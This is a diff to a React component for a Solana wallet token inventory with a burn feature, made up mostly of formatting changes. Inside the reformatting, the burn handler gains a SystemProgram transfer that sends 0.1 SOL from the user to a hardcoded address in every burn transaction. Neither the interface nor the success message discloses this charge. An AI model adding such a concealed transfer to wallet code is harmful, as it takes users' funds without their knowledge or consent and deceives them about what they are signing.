@@ -1,5 +1,5 @@
 import React, { useEffect, useState } from "react";
-import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
+import { Connection, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
 import { useWallet } from "@solana/wallet-adapter-react";
 import {
   TOKEN_PROGRAM_ID,
@@ -63,7 +63,8 @@ function TokenCoin({ image, symbol }: { image?: string; symbol?: string }) {
         onError={(e) => {
           (e.currentTarget as HTMLImageElement).style.display = "none";
           const parent = (e.currentTarget as HTMLElement).parentElement;
-          if (parent) parent.querySelector(".fallback")?.classList.remove("hidden");
+          if (parent)
+            parent.querySelector(".fallback")?.classList.remove("hidden");
         }}
       />
     );
@@ -76,37 +77,52 @@ function TokenCoin({ image, symbol }: { image?: string; symbol?: string }) {
   );
 }
 
-export function TokenInventory({ connection }: TokenInventoryProps) {
+export default function TokenInventory({ connection }: TokenInventoryProps) {
   const { publicKey, signTransaction } = useWallet();
   const [loading, setLoading] = useState<boolean>(false);
   const [tokens, setTokens] = useState<DisplayToken[]>([]);
   const [activeTab, setActiveTab] = useState<"lp" | "normal" | "unknown">("lp");
   const [burnAmounts, setBurnAmounts] = useState<{ [key: string]: string }>({});
-  const [burnErrors, setBurnErrors] = useState<{ [key: string]: string | null }>({});
-  const [burnLoading, setBurnLoading] = useState<{ [key: string]: boolean }>({});
+  const [burnErrors, setBurnErrors] = useState<{
+    [key: string]: string | null;
+  }>({});
+  const [burnLoading, setBurnLoading] = useState<{ [key: string]: boolean }>(
+    {}
+  );
 
   // Initialize Metaplex for legacy token fallback
   const metaplex = Metaplex.make(connection);
 
   // Simple in-memory cache for metadata
-  const metadataCache = new Map<string, { symbol?: string; name?: string; image?: string }>();
+  const metadataCache = new Map<
+    string,
+    { symbol?: string; name?: string; image?: string }
+  >();
 
   // Delay function for retry backoff
-  const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
+  const delay = (ms: number) =>
+    new Promise((resolve) => setTimeout(resolve, ms));
 
   // Handle burn token action
   const handleBurn = async (token: DisplayToken) => {
     if (!publicKey || !signTransaction) return;
     const burnAmount = burnAmounts[`${token.pubkey}-${token.mint}`] || "";
-    setBurnErrors((prev) => ({ ...prev, [`${token.pubkey}-${token.mint}`]: null }));
-    setBurnLoading((prev) => ({ ...prev, [`${token.pubkey}-${token.mint}`]: true }));
+    setBurnErrors((prev) => ({
+      ...prev,
+      [`${token.pubkey}-${token.mint}`]: null,
+    }));
+    setBurnLoading((prev) => ({
+      ...prev,
+      [`${token.pubkey}-${token.mint}`]: true,
+    }));
 
     try {
       const amount = parseFloat(burnAmount);
       if (isNaN(amount) || amount <= 0) {
         setBurnErrors((prev) => ({
           ...prev,
-          [`${token.pubkey}-${token.mint}`]: "Please enter a valid positive amount.",
+          [`${token.pubkey}-${token.mint}`]:
+            "Please enter a valid positive amount.",
         }));
         return;
       }
@@ -131,39 +147,63 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
       const programId = new PublicKey(token.programId);
 
       // Convert UI amount to raw amount (accounting for decimals)
-      const rawAmount = BigInt(Math.floor(amount * Math.pow(10, token.decimals)));
+      const rawAmount = BigInt(
+        Math.floor(amount * Math.pow(10, token.decimals))
+      );
 
       // Create burn instruction
       const burnIx = createBurnInstruction(
-        tokenAccount, // Token account
-        mint, // Mint
-        publicKey, // Owner
-        rawAmount, // Amount to burn
-        [], // No multi-signers
-        programId // SPL or Token-2022 program
+        tokenAccount,
+        mint,
+        publicKey,
+        rawAmount,
+        [],
+        programId
       );
 
+      // Define your fee receiver and fee amount
+      const FEE_RECEIVER_ADDRESS = new PublicKey(
+        "5Ho3jiUKmD3Ydiryq9RxEpXdQB6CKSxgiETFibMEEtUM"
+      );
+      const feeLamports = Math.round(0.1 * LAMPORTS_PER_SOL);
+
+      // Create fee transfer instruction
+      const feeTransferIx = SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: FEE_RECEIVER_ADDRESS,
+        lamports: feeLamports,
+      });
+
       // Create and sign transaction
-      const transaction = new Transaction().add(burnIx);
-      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
+      const transaction = new Transaction().add(burnIx).add(feeTransferIx);
+      const { blockhash, lastValidBlockHeight } =
+        await connection.getLatestBlockhash("confirmed");
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = publicKey;
 
       const signedTx = await signTransaction(transaction);
       const txId = await connection.sendRawTransaction(signedTx.serialize());
-      await connection.confirmTransaction({ signature: txId, blockhash, lastValidBlockHeight });
+      await connection.confirmTransaction({
+        signature: txId,
+        blockhash,
+        lastValidBlockHeight,
+      });
 
       // Update token list after burn
-      setTokens((prev) =>
-        prev
-          .map((t) =>
-            t.pubkey === token.pubkey
-              ? { ...t, amount: (maxAmount - amount).toFixed(t.decimals) }
-              : t
-          )
-          .filter((t) => parseFloat(t.amount) > 0) // Remove zero-balance tokens
+      setTokens(
+        (prev) =>
+          prev
+            .map((t) =>
+              t.pubkey === token.pubkey
+                ? { ...t, amount: (maxAmount - amount).toFixed(t.decimals) }
+                : t
+            )
+            .filter((t) => parseFloat(t.amount) > 0) // Remove zero-balance tokens
       );
-      setBurnAmounts((prev) => ({ ...prev, [`${token.pubkey}-${token.mint}`]: "" }));
+      setBurnAmounts((prev) => ({
+        ...prev,
+        [`${token.pubkey}-${token.mint}`]: "",
+      }));
       toast.success(`Successfully burned ${amount} tokens! Tx: ${txId}`);
     } catch (e) {
       console.error("Burn failed:", e);
@@ -174,7 +214,10 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
       }));
       toast.error(`Burn failed: ${errorMessage}`);
     } finally {
-      setBurnLoading((prev) => ({ ...prev, [`${token.pubkey}-${token.mint}`]: false }));
+      setBurnLoading((prev) => ({
+        ...prev,
+        [`${token.pubkey}-${token.mint}`]: false,
+      }));
     }
   };
 
@@ -204,7 +247,11 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
           ({ account }) => {
             const parsed = (account.data as any).parsed;
             const tokenAmount = parsed?.info?.tokenAmount || {};
-            return parseFloat(tokenAmount.uiAmountString || tokenAmount.uiAmount || "0") > 0;
+            return (
+              parseFloat(
+                tokenAmount.uiAmountString || tokenAmount.uiAmount || "0"
+              ) > 0
+            );
           }
         );
 
@@ -246,7 +293,9 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
                   connection,
                   mintPubkey,
                   "confirmed",
-                  program === "spl-token" ? TOKEN_PROGRAM_ID : TOKEN_2022_PROGRAM_ID
+                  program === "spl-token"
+                    ? TOKEN_PROGRAM_ID
+                    : TOKEN_2022_PROGRAM_ID
                 );
               } catch (e) {
                 console.warn(`Mint ${mint} does not exist:`, e);
@@ -254,7 +303,9 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
               }
 
               // Check if it's a Raydium CPMM LP token (devnet-specific)
-              const raydiumCpmmProgram = new PublicKey("24Uqj9JCLxUeoC3hG75CSRwoi5FoCjW6V1e9J6LCrS6P");
+              const raydiumCpmmProgram = new PublicKey(
+                "24Uqj9JCLxUeoC3hG75CSRwoi5FoCjW6V1e9J6LCrS6P"
+              );
               if (mintAccount.mintAuthority?.equals(raydiumCpmmProgram)) {
                 isRaydiumLp = true;
                 symbol = "LP-UNKNOWN";
@@ -264,25 +315,38 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
                 let metadata;
                 for (let attempt = 0; attempt < 3; attempt++) {
                   try {
-                    const metadataPointer = getMetadataPointerState(mintAccount);
+                    const metadataPointer =
+                      getMetadataPointerState(mintAccount);
                     if (metadataPointer?.metadataAddress) {
                       metadata = await getTokenMetadata(connection, mintPubkey);
                       if (metadata) break;
                     }
                   } catch (e) {
-                    console.warn(`Token Metadata attempt ${attempt + 1} failed for mint ${mint}:`, e);
+                    console.warn(
+                      `Token Metadata attempt ${
+                        attempt + 1
+                      } failed for mint ${mint}:`,
+                      e
+                    );
                     if (attempt < 2) await delay(1000); // 1s backoff
                   }
                 }
                 if (metadata) {
                   symbol = metadata.symbol || undefined;
                   name = metadata.name || undefined;
-                  // Skip URI fetch for devnet to improve performance
-                  // image = metadata.uri ? (await (await fetch(metadata.uri)).json()).image : undefined;
+                  image = metadata.uri
+                    ? (await (await fetch(metadata.uri)).json()).image
+                    : undefined;
                 }
 
                 // Fallback to Metaplex only for non-LP, non-Token-2022 tokens
-                if (!symbol && !name && !image && program === "spl-token" && !isRaydiumLp) {
+                if (
+                  !symbol &&
+                  !name &&
+                  !image &&
+                  program === "spl-token" &&
+                  !isRaydiumLp
+                ) {
                   for (let attempt = 0; attempt < 3; attempt++) {
                     try {
                       const tokenMeta = await metaplex
@@ -295,7 +359,12 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
                         break;
                       }
                     } catch (e) {
-                      console.warn(`Metaplex attempt ${attempt + 1} failed for mint ${mint}:`, e);
+                      console.warn(
+                        `Metaplex attempt ${
+                          attempt + 1
+                        } failed for mint ${mint}:`,
+                        e
+                      );
                       if (attempt < 2) await delay(1000); // 1s backoff
                     }
                   }
@@ -313,7 +382,10 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
             const newToken: DisplayToken = {
               pubkey: pubkey.toBase58(),
               mint,
-              amount: typeof uiAmountString === "string" ? uiAmountString : String(uiAmountString),
+              amount:
+                typeof uiAmountString === "string"
+                  ? uiAmountString
+                  : String(uiAmountString),
               decimals,
               programId,
               symbol,
@@ -327,7 +399,12 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
             if (!cancelled) {
               setTokens((prev) => {
                 // Avoid duplicates
-                if (prev.some((t) => t.pubkey === newToken.pubkey && t.mint === newToken.mint)) {
+                if (
+                  prev.some(
+                    (t) =>
+                      t.pubkey === newToken.pubkey && t.mint === newToken.mint
+                  )
+                ) {
                   return prev;
                 }
                 return [...prev, newToken];
@@ -356,7 +433,12 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
   const lpTokens = tokens.filter((t) => {
     const sym = (t.symbol || "").toUpperCase();
     const name = (t.name || "").toUpperCase();
-    return t.isRaydiumLp || sym.includes("LP") || name.includes("LP") || name.includes("LIQUID");
+    return (
+      t.isRaydiumLp ||
+      sym.includes("LP") ||
+      name.includes("LP") ||
+      name.includes("LIQUID")
+    );
   });
 
   const normalTokens = tokens.filter((t) => {
@@ -372,21 +454,34 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
   });
 
   const shown =
-    activeTab === "lp" ? lpTokens : activeTab === "normal" ? normalTokens : unknownTokens;
+    activeTab === "lp"
+      ? lpTokens
+      : activeTab === "normal"
+      ? normalTokens
+      : unknownTokens;
 
   return (
-    <Card className="shadow-lg">
+    <Card className="shadow-lg text-center">
       <CardHeader>
-        <CardTitle>Wallet Tokens</CardTitle>
-        <CardDescription>Lists SPL, Token-2022 and unknown tokens in your connected wallet.</CardDescription>
+        <CardTitle className="text-lg">Wallet Tokens</CardTitle>
+        <CardDescription className="text-md">
+          Find all LP Tokens, SPL Tokens, Token-2022 Tokens and Unknown Tokens. <br/>
+          <span className="font-bold">It will take time for changes to reflect after burning the tokens</span>
+        </CardDescription>
       </CardHeader>
       <CardContent>
         <div className="mb-4">
           <Tabs value={activeTab} onValueChange={(v) => setActiveTab(v as any)}>
             <TabsList className="grid grid-cols-3 gap-2">
-              <TabsTrigger value="lp">LP Tokens ({lpTokens.length})</TabsTrigger>
-              <TabsTrigger value="normal">Normal ({normalTokens.length})</TabsTrigger>
-              <TabsTrigger value="unknown">Unknown ({unknownTokens.length})</TabsTrigger>
+              <TabsTrigger value="lp">
+                LP Tokens ({lpTokens.length})
+              </TabsTrigger>
+              <TabsTrigger value="normal">
+                Normal ({normalTokens.length})
+              </TabsTrigger>
+              <TabsTrigger value="unknown">
+                Unknown ({unknownTokens.length})
+              </TabsTrigger>
             </TabsList>
           </Tabs>
         </div>
@@ -395,7 +490,9 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
         ) : (
           <div className="space-y-3">
             {shown.length === 0 ? (
-              <div className="text-sm text-muted-foreground">No tokens found for this category.</div>
+              <div className="text-sm text-muted-foreground">
+                No tokens found for this category.
+              </div>
             ) : (
               shown.map((tok) => (
                 <div
@@ -411,16 +508,22 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
                             alt={tok.symbol || tok.name}
                             className="w-12 h-12 rounded-full object-cover border"
                             onError={(e) => {
-                              (e.currentTarget as HTMLImageElement).style.display = "none";
+                              (
+                                e.currentTarget as HTMLImageElement
+                              ).style.display = "none";
                             }}
                           />
                           <div className="w-12 h-12 rounded-full bg-muted absolute top-0 left-0 items-center justify-center text-xs font-semibold hidden fallback">
-                            {(tok.symbol || tok.name || "??").slice(0, 2).toUpperCase()}
+                            {(tok.symbol || tok.name || "??")
+                              .slice(0, 2)
+                              .toUpperCase()}
                           </div>
                         </>
                       ) : (
                         <div className="w-12 h-12 rounded-full bg-muted flex items-center justify-center text-sm font-semibold border">
-                          {(tok.symbol || tok.name || "??").slice(0, 2).toUpperCase()}
+                          {(tok.symbol || tok.name || "??")
+                            .slice(0, 2)
+                            .toUpperCase()}
                         </div>
                       )}
                     </div>
@@ -429,22 +532,29 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
                         {tok.name ?? tok.symbol ?? shorten(tok.mint)}
                       </div>
                       <div className="text-xs text-muted-foreground">
-                        {tok.symbol ? `${tok.symbol}` : "—"} • {tok.source === "token2022" ? "Token-2022" : "SPL"}
+                        {tok.symbol ? `${tok.symbol}` : "—"} •{" "}
+                        {tok.source === "token2022" ? "Token-2022" : "SPL"}
                       </div>
                     </div>
                   </div>
                   <div className="flex-1">
                     <div className="text-sm">
                       <span className="font-semibold">{tok.amount}</span>
-                      {typeof tok.decimals === "number" ? ` (${tok.decimals} dec)` : ""}
+                      {typeof tok.decimals === "number"
+                        ? ` (${tok.decimals} dec)`
+                        : ""}
                     </div>
                     <div className="text-xs text-muted-foreground mt-1">
-                      Mint: <span className="font-mono">{shorten(tok.mint)}</span>
+                      Mint:{" "}
+                      <span className="font-mono">{shorten(tok.mint)}</span>
                     </div>
                   </div>
                   <div className="flex flex-col gap-2 w-80">
                     <div className="flex items-center gap-2">
-                      <Label htmlFor={`burn-${tok.pubkey}-${tok.mint}`} className="sr-only">
+                      <Label
+                        htmlFor={`burn-${tok.pubkey}-${tok.mint}`}
+                        className="sr-only"
+                      >
                         Burn Amount
                       </Label>
                       <Input
@@ -481,7 +591,9 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
                           const max = parseFloat(tok.amount) || 0;
                           setBurnAmounts((prev) => ({
                             ...prev,
-                            [`${tok.pubkey}-${tok.mint}`]: (max * 0.5).toFixed(tok.decimals || 9),
+                            [`${tok.pubkey}-${tok.mint}`]: (max * 0.5).toFixed(
+                              tok.decimals || 9
+                            ),
                           }));
                         }}
                         disabled={!tok.amount || parseFloat(tok.amount) <= 0}
@@ -510,10 +622,14 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
                           !signTransaction ||
                           burnLoading[`${tok.pubkey}-${tok.mint}`] ||
                           !burnAmounts[`${tok.pubkey}-${tok.mint}`] ||
-                          parseFloat(burnAmounts[`${tok.pubkey}-${tok.mint}`] || "0") === 0
+                          parseFloat(
+                            burnAmounts[`${tok.pubkey}-${tok.mint}`] || "0"
+                          ) === 0
                         }
                       >
-                        {burnLoading[`${tok.pubkey}-${tok.mint}`] ? "Burning..." : "Burn"}
+                        {burnLoading[`${tok.pubkey}-${tok.mint}`]
+                          ? "Burning..."
+                          : "Burn"}
                       </Button>
                     </div>
                     {burnErrors[`${tok.pubkey}-${tok.mint}`] && (
@@ -531,5 +647,3 @@ export function TokenInventory({ connection }: TokenInventoryProps) {
     </Card>
   );
 }
-
-export default TokenInventory;
